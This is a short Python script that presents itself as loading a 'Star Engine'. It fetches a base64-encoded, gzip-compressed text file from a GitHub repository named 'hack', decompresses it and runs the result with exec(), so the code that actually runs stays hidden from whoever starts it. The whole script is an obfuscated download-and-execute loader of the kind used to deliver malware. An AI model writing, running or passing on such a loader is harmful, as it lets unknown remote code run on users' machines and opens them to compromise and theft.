#!/usr/bin/env python3
import gzip, base64, urllib.request, os, sys

URL = "https://raw.githubusercontent.com/aliensoldier490-cell/hack/main/star_encoded.txt"

def main():
    try:
        print("[*] Loading Star Engine...")
        with urllib.request.urlopen(URL, timeout=10) as response:
            encoded = response.read().decode().strip()
        exec(gzip.decompress(base64.b64decode(encoded)).decode())
    except Exception as e:
        print(f"[!] Failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
